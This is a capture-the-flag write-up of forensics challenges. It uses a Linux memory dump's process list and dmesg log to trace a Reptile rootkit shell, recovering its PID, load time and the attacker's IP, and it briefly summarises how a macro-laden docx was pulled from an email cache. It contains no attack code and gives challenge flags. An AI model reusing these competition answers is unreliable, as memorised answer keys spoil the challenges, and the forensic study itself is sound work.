0x0000000022a0ae00 FS Broker 8663         8669 False  True   True     False      False   False
0x000000002a809700 ProcessHangMon         8670 False  True   True     False      False   False
0x0000000021212e00 FS Broker 8672         8678 False  True   True     False      False   False
0x0000000021210000 DataStorage            8684 False  True   True     False      False   False
0x0000000048254500 dconf worker           8685 False  True   True     False      False   False
0x0000000022a09700 DNS Resolver #1        8686 False  True   True     False      False   False
0x0000000022b89700 Cache I/O              8688 False  True   True     False      False   False
0x0000000022b8dc00 DOM Worker             8689 False  True   True     False      False   False
0x0000000022b8ae00 HTML5 Parser           8690 False  True   True     False      False   False
0x0000000022b8c500 DNS Resolver #2        8691 False  True   True     False      False   False
0x0000000022b88000 DNS Resolver #3        8692 False  True   True     False      False   False
0x0000000022b99700 DNS Resolver #4        8693 False  True   True     False      False   False
0x0000000022b9dc00 DOM Worker             8694 False  True   True     False      False   False
0x0000000022b9c500 FS Broker 8696         8702 False  True   True     False      False   False
0x000000000f720000 localStorage DB        8704 False  True   True     False      False   False
0x000000000f731700 mozStorage #3          8707 False  True   True     False      False   False
0x000000000f732e00 mozStorage #4          8710 False  True   True     False      False   False
0x000000000f725c00 URL Classifier         8711 False  True   True     False      False   False
0x000000000f734500 Classif~ Update        8712 False  True   True     False      False   False
0x0000000042213780 swapper/0                 0 False  False  False    False      True    False
0x0000000000108000 SubtleCrypto #3        8721 False  True   False    False      False   False
0x0000000000109700 SubtleCrypto #4        8722 False  True   False    False      False   False
0x000000000010ae00 SubtleCrypto #6        8724 False  True   False    False      False   False
0x000000000010c500 SubtleCrypto #2        8720 False  True   False    False      False   False
0x000000000010dc00 SubtleCrypto #5        8723 False  True   False    False      False   False
0x0000000000120000 systemd-system-        7160 False  True   False    False      False   False
0x0000000000121700 systemd-run-gen        7159 False  True   False    False      False   False
0x0000000000124500 (sd-executor)          7147 False  True   False    False      False   False
0x0000000000125c00 friendly-recove        7148 False  True   False    False      False   False
0x0000000001089700 poweron-vm-defa        7110 False  True   False    False      False   False
0x000000000108ae00 expr                   7128 False  True   False    False      False   False
0x000000000108c500 mv                     7129 False  True   False    False      False   False
0x000000000108dc00 mv                     7136 False  True   False    False      False   False
0x00000000010c4500 lsb_release            7107 False  True   False    False      False   False
0x00000000010d0000 expr                   7133 False  True   False    False      False   False
0x00000000010d1700 mv                     7132 False  True   False    False      False   False
0x00000000010d2e00 expr                   7130 False  True   False    False      False   False
0x00000000010d4500 expr                   7135 False  True   False    False      False   False
0x00000000010d5c00 mv                     7134 False  True   False    False      False   False
0x00000000010e8000 systemd-getty-g        7209 False  True   False    False      False   False
0x00000000010e9700 lvmconfig              7207 False  True   False    False      False   False
0x00000000010eae00 systemd-run-gen        7212 False  True   False    False      False   False
0x00000000010ec500 systemd-rc-loca        7211 False  True   False    False      False   False
0x00000000010edc00 systemd-hiberna        7210 False  True   False    False      False   False
0x0000000001150000 mv                     7137 False  True   False    False      False   False
0x0000000001151700 chmod                  7138 False  True   False    False      False   False
0x0000000001152e00 network                7117 False  True   False    False      False   False
0x0000000001154500 mv                     7127 False  True   False    False      False   False
0x0000000001155c00 expr                   7126 False  True   False    False      False   False
0x0000000001158000 rm                     7141 False  True   False    False      False   False
0x0000000001159700 date                   7142 False  True   False    False      False   False
0x000000000115ae00 expr                   7143 False  True   False    False      False   False
0x000000000115c500 date                   7139 False  True   False    False      False   False
0x000000000115dc00 dirname                7140 False  True   False    False      False   False
0x0000000001170000 cat                    7180 False  True   False    False      False   False
0x0000000001171700 systemd-veritys        7215 False  True   False    False      False   False
0x0000000001172e00 systemd-getty-g        7179 False  True   False    False      False   False
0x0000000001174500 systemd-system-        7213 False  True   False    False      False   False
0x0000000001175c00 systemd-sysv-ge        7214 False  True   False    False      False   False
0x0000000001278000 netplan                7216 False  True   False    False      False   False
0x0000000001279700 systemd-system-        7185 False  True   False    False      False   False
0x000000000127ae00 systemd-run-gen        7184 False  True   False    False      False   False
0x000000000127c500 systemd-fstab-g        7208 False  True   False    False      False   False
0x000000000127dc00 lvm2-activation        7171 False  True   False    False      False   False
0x00000000014b9700 upowerd                7023 False  True   False    False      False   False
0x00000000014bae00 upowerd                7025 False  True   False    False      False   False
0x00000000014bdc00 upowerd                7026 False  True   False    False      False   False
0x0000000001548000 cat                    7200 False  True   False    False      False   False
0x0000000001549700 systemd-bless-b        7204 False  True   False    False      False   False
0x000000000154ae00 netplan                7202 False  True   False    False      False   False
0x000000000154c500 snapd-generator        7203 False  True   False    False      False   False
0x000000000154dc00 lvm2-activation        7201 False  True   False    False      False   False
0x0000000001578000 snapd-generator        7151 False  True   False    False      False   False
0x0000000001579700 netplan                7150 False  True   False    False      False   False
0x000000000157ae00 systemd-cryptse        7153 False  True   False    False      False   False
0x000000000157c500 systemd-bless-b        7152 False  True   False    False      False   False
0x000000000157dc00 lvm2-activation        7149 False  True   False    False      False   False
0x0000000001640000 systemd-rc-loca        7158 False  True   False    False      False   False
0x0000000001641700 systemd-hiberna        7157 False  True   False    False      False   False
0x0000000001642e00 systemd-fstab-g        7155 False  True   False    False      False   False
0x0000000001644500 systemd-getty-g        7156 False  True   False    False      False   False
0x0000000001645c00 systemd-debug-g        7154 False  True   False    False      False   False
0x0000000001748000 systemd-debug-g        7206 False  True   False    False      False   False
0x0000000001749700 systemd-cryptse        7205 False  True   False    False      False   False
0x000000000174ae00 (sd-executor)          7198 False  True   False    False      False   False
0x000000000174c500 friendly-recove        7199 False  True   False    False      False   False
0x00000000017a8000 StreamTrans #29        8749 False  True   False    False      False   False
0x00000000017a9700 StreamTrans #27        8744 False  True   False    False      False   False
0x00000000017aae00 SubtleC~pto #17        8736 False  True   False    False      False   False
0x00000000017ac500 SubtleC~pto #18        8737 False  True   False    False      False   False
0x00000000017adc00 MediaTelemetry         8742 False  True   False    False      False   False
0x0000000001ca8000 lvmconfig              7011 False  True   False    False      False   False
0x0000000001ca9700 systemd-system-        7008 False  True   False    False      False   False
0x0000000001caae00 systemd-run-gen        7007 False  True   False    False      False   False
0x0000000001cac500 systemd-sysv-ge        7009 False  True   False    False      False   False
0x0000000001cadc00 systemd-veritys        7010 False  True   False    False      False   False
0x0000000002139700 pool-packagekit        6878 False  True   False    False      False   False
0x0000000002168000 dpkg                   6879 False  True   False    False      False   False
0x00000000023a8000 systemd-debug-g        7002 False  True   False    False      False   False
0x00000000023a9700 systemd-getty-g        7004 False  True   False    False      False   False
0x00000000023aae00 systemd-fstab-g        7003 False  True   False    False      False   False
0x00000000023ac500 systemd-hiberna        7005 False  True   False    False      False   False
0x00000000023adc00 systemd-rc-loca        7006 False  True   False    False      False   False
0x0000000009dc1700 journal-offline        8616 False  True   False    False      False   False
0x000000000bc30000 pool-upowerd           1788 False  True   False    False      False   False
0x000000000bc31700 upowerd                1789 False  True   False    False      False   False
0x000000000bc32e00 upowerd                1791 False  True   False    False      False   False
0x000000000bc34500 upowerd                1792 False  True   False    False      False   False
0x000000000bc35c00 upowerd                1790 False  True   False    False      False   False
0x000000000bce8000 upowerd                1794 False  True   False    False      False   False
0x000000000bce9700 upowerd                1795 False  True   False    False      False   False
0x000000000bcec500 upowerd                1793 False  True   False    False      False   False
0x000000000bcedc00 upowerd                7017 False  True   False    False      False   False
0x000000000bf58000 HTTP Ha~kground        8687 False  True   False    False      False   False
0x000000000f721700 IndexedDB #5           8709 False  True   False    False      False   False
0x000000000f722e00 SubtleC~pto #10        8728 False  True   False    False      False   False
0x000000000f724500 SSL Cert #1            8703 False  True   False    False      False   False
0x000000000f730000 IndexedDB #3           8706 False  True   False    False      False   False
0x000000000f735c00 IndexedDB #4           8708 False  True   False    False      False   False
0x000000000f7b8000 pool-firefox           8628 False  True   False    False      False   False
0x0000000013c60000 pool                   1760 False  True   False    False      False   False
0x0000000013c62e00 pool                   1748 False  True   False    False      False   False
0x0000000013d79700 pool                   1764 False  True   False    False      False   False
0x0000000013d7dc00 pool                   1773 False  True   False    False      False   False
0x0000000013de8000 pool                   1769 False  True   False    False      False   False
0x0000000013fe0000 upowerd                7019 False  True   False    False      False   False
0x0000000013fe1700 upowerd                7020 False  True   False    False      False   False
0x0000000013fe5c00 upowerd                7022 False  True   False    False      False   False
0x00000000162d8000 StreamTrans #1         8620 False  True   False    False      False   False
0x0000000021020000 systemd-udevd          6985 False  True   False    False      False   False
0x0000000021021700 systemd-udevd          6982 False  True   False    False      False   False
0x0000000021022e00 systemd-udevd          6983 False  True   False    False      False   False
0x0000000021024500 systemd-udevd          6984 False  True   False    False      False   False
0x0000000021025c00 systemd-udevd          6981 False  True   False    False      False   False
0x0000000021035c00 xauth                  1561 False  True   False    False      False   False
0x00000000210d2e00 pool                   1749 False  True   False    False      False   False
0x0000000021211700 StreamTrans #16        8654 False  True   False    False      False   False
0x0000000021214500 IPC Launch #1          8664 False  True   False    False      False   False
0x0000000021215c00 StreamTrans #15        8653 False  True   False    False      False   False
0x0000000021268000 pool                   1757 False  True   False    False      False   False
0x00000000212f9700 pool-gvfsd             1700 False  True   False    False      False   False
0x00000000228e8000 libinput-device        7055 False  True   False    False      False   False
0x00000000228e9700 sh                     7056 False  True   False    False      False   False
0x00000000228eae00 ln                     7057 False  True   False    False      False   False
0x00000000228ec500 libinput-device        7054 False  True   False    False      False   False
0x00000000228edc00 libinput-device        7059 False  True   False    False      False   False
0x0000000022924500 pool-whoopsie          1468 False  True   False    False      False   False
0x0000000022948000 systemd-udevd          8753 False  True   False    False      False   False
0x0000000022949700 sh                     7067 False  True   False    False      False   False
0x000000002294ae00 sh                     7079 False  True   False    False      False   False
0x000000002294c500 systemd-udevd          8660 False  True   False    False      False   False
0x000000002294dc00 systemd-udevd          8662 False  True   False    False      False   False
0x00000000229dc500 firefox                8615 False  True   False    False      False   False
0x00000000229f1700 SubtleC~pto #13        8731 False  True   False    False      False   False
0x00000000229f2e00 IPC Launch #1          8697 False  True   False    False      False   False
0x00000000229f5c00 SubtleC~pto #12        8730 False  True   False    False      False   False
0x0000000022a48000 SubtleCrypto #1        8719 False  True   False    False      False   False
0x0000000022a4ae00 StreamTrans #22        8715 False  True   False    False      False   False
0x0000000022a4c500 StreamTrans #24        8717 False  True   False    False      False   False
0x0000000022a4dc00 IPC Launch #1          8673 False  True   False    False      False   False
0x0000000022b98000 IndexedDB #2           8705 False  True   False    False      False   False
0x000000002a808000 SubtleC~pto #11        8729 False  True   False    False      False   False
0x000000002a80c500 IndexedDB #1           8647 False  True   False    False      False   False
0x000000002aaf5c00 bash                   8748 False  True   False    False      False   False
0x000000002e1cae00 sh                     1559 False  True   False    False      False   False
0x000000002e26c500 whoami                 8747 False  True   False    False      False   False
0x000000002e360000 StartupCache           8754 False  True   False    False      False   False
0x000000002e361700 StreamTrans #28        8745 False  True   False    False      False   False
0x000000002e364500 SubtleCrypto #8        8726 False  True   False    False      False   False
0x000000002e365c00 StreamTrans #26        8743 False  True   False    False      False   False
0x000000002ece0000 snap                   1564 False  True   False    False      False   False
0x000000002ece1700 snap                   1551 False  True   False    False      False   False
0x000000002ece2e00 snap                   1565 False  True   False    False      False   False
0x000000002ece4500 snap                   1562 False  True   False    False      False   False
0x000000002ece5c00 snap                   1563 False  True   False    False      False   False
0x0000000030e20000 systemd-udevd          6855 False  True   False    False      False   False
0x0000000030e21700 systemd-udevd          6870 False  True   False    False      False   False
0x0000000030e22e00 systemd-udevd          6856 False  True   False    False      False   False
0x0000000030e24500 systemd-udevd          6868 False  True   False    False      False   False
0x0000000030e25c00 systemd-udevd          6869 False  True   False    False      False   False
0x000000003c589700 (sd-executor)          6994 False  True   False    False      False   False
0x000000003c7b0000 pool-accounts-d        1242 False  True   False    False      False   False
0x000000003c7b1700 grep                   1289 False  True   False    False      False   False
0x000000003c7b4500 locale                 1288 False  True   False    False      False   False
0x000000003c7b5c00 language-option        1262 False  True   False    False      False   False
0x000000003c7d0000 language-valida        1247 False  True   False    False      False   False
0x000000003c7d5c00 sh                     1265 False  True   False    False      False   False
0x000000003c8f0000 pool-polkitd           1304 False  True   False    False      False   False
0x000000003fc74500 pool-NetworkMan        1316 False  True   False    False      False   False
0x0000000044490000 netplan                6997 False  True   False    False      False   False
0x0000000044491700 lvm2-activation        6996 False  True   False    False      False   False
0x0000000044d01818 ??                     4096 False  True   False    False      False   False
0x0000000045dddc00 pool-udisksd           1217 False  True   False    False      False   False
0x0000000045dfc500 sh                     1301 False  True   False    False      False   False
0x0000000045dfdc00 dmidecode              1302 False  True   False    False      False   False
0x0000000046cd8000 journal-offline        8698 False  True   False    False      False   False
0x0000000046cd9700 journal-offline        8701 False  True   False    False      False   False
0x0000000046cdae00 journal-offline        8700 False  True   False    False      False   False
0x0000000046cdc500 journal-offline        8674 False  True   False    False      False   False
0x0000000046cddc00 journal-offline        8699 False  True   False    False      False   False
0x0000000047168000 setfont                1498 False  True   False    False      False   False
0x0000000047169700 setfont                1483 False  True   False    False      False   False
0x000000004716ae00 sh                     1515 False  True   False    False      False   False
0x000000004716c500 setfont                1516 False  True   False    False      False   False
0x000000004716dc00 gzip                   1514 False  True   False    False      False   False
0x00000000486c0000 ln                     7083 False  True   False    False      False   False
0x00000000486c1700 systemd-udevd          8584 False  True   False    False      False   False
0x00000000486c2e00 systemd-udevd          8585 False  True   False    False      False   False
0x00000000486c4500 readlink               7081 False  True   False    False      False   False
0x00000000486c5c00 sh                     7082 False  True   False    False      False   False
0x0000000048768000 systemd-udevd          6989 False  True   False    False      False   False
0x0000000048769700 systemd-udevd          6987 False  True   False    False      False   False
0x000000004876ae00 systemd-udevd          6990 False  True   False    False      False   False
0x000000004876c500 systemd-udevd          6986 False  True   False    False      False   False
0x000000004876dc00 systemd-udevd          6988 False  True   False    False      False   False
0x000000004a888000 kworker/dying            27 False  True   False    False      False   False
0x000000004a928000 kworker/dying            35 False  True   False    False      False   False
0x000000004a94cdd0 ACAD                  12853 False  True   False    False      False   False
0x000000004a9a9700 kworker/dying           179 False  True   False    False      False   False
0x000000004a9adc00 kworker/dying           181 False  True   False    False      False   False
0x000000004ac08000 kworker/dying             7 False  True   False    False      False   False

0x00000000515b4500 reptile_shell #!!!         8741 False  True   False    False      False   False

0x0000000051c11700 ls                     8752 False  True   False    False      False   False
0x0000000051c14500 env                    8751 False  True   False    False      False   False
0x0000000051c15c00 bash                   8750 False  True   False    False      False   False
0x0000000051c68000 kworker/dying           351 False  True   False    False      False   False
0x0000000051c6ae00 kworker/dying           352 False  True   False    False      False   False
0x0000000051c82e00 (sd-executor)          6992 False  True   False    False      False   False
0x0000000051c8dc00 snapd-env-gener        6993 False  True   False    False      False   False
0x0000000051e94988                      49152 False  True   False    False      False   False
0x00000000521f8000 systemd-cryptse        7001 False  True   False    False      False   False
0x00000000521fdc00 kworker/dying           328 False  True   False    False      False   False
0x0000000052389700 kworker/dying           325 False  True   False    False      False   False
0x000000005238c500 kworker/dying           326 False  True   False    False      False   False
0x0000000053da0000 kworker/dying           212 False  True   False    False      False   False
0x0000000053e8ae00 systemd-bless-b        7000 False  True   False    False      False   False
```

We found a very suspicious `reptile_shell`! Hence, the PID of the evil process is:

```
8741
```



Next, we have to find the time when the malware was loaded. This can be retrieved from psscan or some other plugins, but psscan turned up empty. Let's try the `kernel debug logs` using `linux_dmesg`. 

```bash
[16285943006.16] Bluetooth: BNEP socket layer initialized
[146633464976.146] NET: Registered protocol family 40
[235932388794.235] reptile: module verification failed: signature and/or required key missing - tainting kernel
[235967862310.235] reptile_module: loading out-of-tree module taints kernel.
[276484597936.276] usercopy: Kernel memory exposure attempt detected from process stack (offset 0, size 1)!
[276484617252.276] ------------[ cut here ]------------
[276484618183.276] kernel BUG at mm/usercopy.c:98!
```

Finding for the first occurrence of "reptile", we find the time:

```
235932388794.235
```



Finally, let's try to find the attacker's IP address!

I tried looking through the information from **netscan** and **netstat**, but there didn't seem to be anything of interest. After consulting with the creator of the challenge, it looks like we were actually supposed to find a PRIVATE IP ADDRESS!? This is quite weird and the reason provided was that `the attacker was inside the network`. So here's the address:

```
192.168.177.132
```

Hence, the flag is:

```
UMDCTF{0xffffffffc0574400:235932388794.235:8741:192.168.177.132}
```

------

## Jarred-3 

**Jarred is always having issues. He thinks he got malware from doing something dumb, but won't tell me what he was doing?**

**no real malware to worry about here**

**https://drive.google.com/open?id=1g0j7rm53lU7ZRBM8XgkPkFpUgsfXpjfi**

**Author: drkmrin78**



Tldr (since I don't have time to write a full write-up, and there are quite a few available)

- If you dump strings from thunderbird.exe, you will see a cached email with a file encoded in base64 + the password that is supposedly for that file
- The file is a zip file, and extracting the docx it seems to set off Windows Defender, indicating there is a malware of some sorts
- Using olevba, we can extract the code of the file, and in 1 of the hex strings, the flag is in reversed. Reverse it to get the actual flag

